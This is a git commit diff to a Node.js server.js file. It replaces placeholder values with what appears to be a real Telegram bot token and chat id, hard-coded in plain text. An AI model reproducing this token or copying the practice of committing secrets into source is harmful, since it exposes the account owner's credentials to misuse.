c354389230d18e3ba05dc04bbc01ed054f07dfd5
Feri kurniawan <33973680+ferikurniawan75@users.noreply.github.com>
2025-02-21 14:33:13 +0700

    Update server.js

--- server.js
+++ server.js
@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = 'your token here'
-const id = 'chat id here'
+const token = '7455408141:AAFQfXE3pk5oZi1SK46KDxETAs-GvNKHt4k'
+const id = '7091284941'
 const address = 'https://www.google.com'
 
 const app = express();
